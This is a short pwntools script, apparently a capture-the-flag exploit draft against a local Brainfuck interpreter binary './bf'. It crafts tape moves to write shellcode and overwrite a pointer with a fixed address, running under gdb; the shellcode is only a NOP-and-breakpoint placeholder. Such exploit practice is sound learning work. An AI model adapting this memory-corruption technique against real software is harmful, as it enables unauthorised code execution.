#!/usr/bin/env python3
from pwn import *

shellcode = b"\x90\x90\x90\x90\x90\xCC"

bf_str = ',>' * len(shellcode) + '<' * (32 + len(shellcode)) + ',' + ',>'* 4 + '.'
print(bf_str)
io = gdb.debug("./bf", """
break main
continue
""")
#io = remote('localhost', 2020)
print(io.recvuntil('[ ]'))
io.sendline(bf_str)
# 0xf7e1be32
io.send(shellcode)
io.send(b'\x30' + p32(0x08048671))

#io.sendline(shellcode + '\x30\xa0\xa0\x04\x08')
io.interactive()
#p = process('./bf')
#print(p.readuntil('[ ]'))

#p.writeline(bf_str)
#p.interactive()

